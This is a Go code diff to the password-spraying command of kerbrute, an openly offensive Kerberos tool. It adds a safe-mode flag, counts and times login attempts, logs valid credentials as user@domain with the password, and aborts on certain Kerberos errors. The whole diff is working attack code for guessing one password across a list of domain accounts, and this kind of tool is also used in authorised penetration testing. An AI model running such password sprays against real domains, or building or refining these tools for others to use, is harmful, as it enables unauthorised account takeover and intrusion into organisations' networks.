@@ -1,8 +1,11 @@
 package cmd
 
 import (
+	"bufio"
 	"fmt"
 	"log"
+	"os"
+	"time"
 
 	"github.com/ropnop/kerbrute/session"
 	"github.com/spf13/cobra"
@@ -32,9 +35,10 @@ func passwordSpray(cmd *cobra.Command, args []string) {
 	password := args[1]
 	domain, _ := cmd.Flags().GetString("domain")
 	domainController, _ := cmd.Flags().GetString("dc")
-	fmt.Printf("domain: %v\ndc: %v\n", domain, domainController)
-	 verbose, _ := cmd.Flags().GetBool("verbose")
-	kSession := session.NewKerbruteSession(domain, domainController, verbose)
+	verbose, _ := cmd.Flags().GetBool("verbose")
+	safe, _ := cmd.Flags().GetBool("safe")
+
+	kSession := session.NewKerbruteSession(domain, domainController, verbose, safe)
 
 	log.Println("Using KDC(s):")
 	for _, v := range kSession.Kdcs {
@@ -48,21 +52,31 @@ func passwordSpray(cmd *cobra.Command, args []string) {
 	defer file.Close()
 
 	scanner := bufio.NewScanner(file)
+
 	var username string
+	count := 0
+	start := time.Now()
 	for scanner.Scan() {
+		count++
 		username = scanner.Text()
-		if ok, err := kSession.TestLogin(username, opts.Args.Password); ok {
-			log.Printf("[!] Valid Login: \t%v : %v", username, opts.Args.Password)
+		login := fmt.Sprintf("%v@%v", username, domain)
+		if ok, err := kSession.TestLogin(username, password); ok {
+			log.Printf("[+] VALID LOGIN:\t %s : %s", login, password)
 		} else {
-			kSession.HandleKerbError(err)
+			// This is to determine if the error is "okay" or if we should abort everything
+			if ok, errorString := kSession.HandleKerbError(err); !ok {
+				log.Printf("[!] %v :\t %v", login, errorString)
+				return
+			} else if kSession.Verbose {
+				log.Printf("[!] %v :\t %v", login, errorString)
+			}
 		}
 	}
 	log.Println("...done!")
+	log.Printf("Tested %d logins in %.3f seconds", count, time.Since(start).Seconds())
 
 	if err := scanner.Err(); err != nil {
 		log.Fatal(err)
 	}
-
-}
 
 }
